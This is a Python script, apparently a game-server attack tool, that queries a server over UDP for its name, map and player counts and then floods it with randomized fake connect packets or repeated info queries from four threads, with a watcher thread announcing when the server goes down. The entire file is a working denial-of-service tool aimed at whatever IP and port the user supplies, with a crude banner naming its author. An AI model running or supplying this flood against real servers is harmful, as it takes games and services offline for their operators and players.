import socket, sys, os, time, threading, random, string

C = {"0":"\033[30m","1":"\033[31m","2":"\033[32m","3":"\033[33m","4":"\033[34m","5":"\033[36m","6":"\033[35m","7":"\033[37m"}
R, G, RD, Y = "\033[0m", "\033[92m", "\033[91m", "\033[93m"

def col(s):
    out, i = "", 0
    while i < len(s):
        if s[i] == "^" and i+1 < len(s) and s[i+1] in C:
            out += C[s[i+1]]; i += 2
        else:
            out += s[i]; i += 1
    return out + R

def q(ip, port, t=2.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(t)
    try:
        s.sendto(b"\xff\xff\xff\xffinfo 49\n", (ip, port))
        d, _ = s.recvfrom(8192)
    except:
        return None
    finally:
        s.close()
    if d.startswith(b"\xff\xff\xff\xff"): d = d[4:]
    txt = d.decode("latin-1", "replace").replace("\n", "").strip()
    if txt.startswith("info"): txt = txt[4:]
    p = txt.split("\\")
    return {p[i]: p[i+1] for i in range(1, len(p)-1, 2)}

def info(d, ip, port):
    if not d:
        print(f"{RD}[-] no response{R}"); return
    print(f"\n[+] {ip}:{port}")
    print("─" * 40)
    for k, l in [("host","Host"),("map","Map"),("numcl","Ply"),("maxcl","Max"),("gamedir","Dir"),("p","Proto")]:
        print(f"  {l:5} : {col(d.get(k,'?')) if k=='host' else d.get(k,'?')}")

os.system('cls' if os.name=='nt' else 'clear')
print(G + r"""
╔═══════════════════════════════════╗
║   yarrak server fucker by reBash  ║
╚═══════════════════════════════════╝
""" + R)

if len(sys.argv) >= 3:
    ip, port = sys.argv[1], int(sys.argv[2])
else:
    ip = input(f"{G}[*] IP: {R}").strip()
    port = int(input(f"{G}[*] PORT: {R}").strip() or "27015")

info(q(ip, port), ip, port)

if input(f"\n{G}[?] attack? (y/n): {R}").strip().lower() != "y":
    sys.exit(0)

print(f"{Y}1{R} connect  {Y}2{R} info")
mode = input(f"{G}[?] mode: {R}").strip() or "1"
if mode not in ("1","2"): mode = "1"

dur = int(input(f"{G}[*] time: {R}").strip() or "60")

INFO_PKT = b"\xff\xff\xff\xffinfo 49\n"
stop = threading.Event()

ABC = string.ascii_letters + string.digits

def rnd(n): return "".join(random.choice(ABC) for _ in range(n))

def pkt():
    ch = rnd(random.randint(16,32))
    uid = rnd(32)
    qp = str(random.randint(10000,65535))
    nm = rnd(random.randint(8,16))
    extra = b""
    for _ in range(random.randint(2,4)):
        k = b"\\cl_" + "".join(random.choice(string.ascii_letters) for _ in range(random.randint(4,12))).encode()
        v = rnd(random.randint(24,48)).encode()
        extra += k + b"\\" + v
    return (b"\xff\xff\xff\xffconnect 49 " + ch.encode() +
            b" \"\\uuid\\" + uid.encode() + b"\\qport\\" + qp.encode() +
            b"\\ext\\1" + extra + b"\" \"\\name\\" + nm.encode() + b"\"\n")

def flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        while not stop.is_set():
            for _ in range(100):
                try:
                    s.sendto(pkt() if mode=="1" else INFO_PKT, (ip, port))
                except: pass
            time.sleep(0.001)
    finally:
        s.close()

def watch():
    while not stop.is_set():
        if q(ip, port, 1.5) is None:
            print(f"{RD}[!] server down{R}")
        time.sleep(1)

print(f"{G}[+] {('connect' if mode=='1' else 'info')} flood {dur}s{R}")

for _ in range(4):
    threading.Thread(target=flood, daemon=True).start()
threading.Thread(target=watch, daemon=True).start()

t = time.time()
try:
    while time.time() - t < dur: time.sleep(0.2)
except KeyboardInterrupt: pass

stop.set()
time.sleep(0.5)
print(f"{G}[+] done{R}")
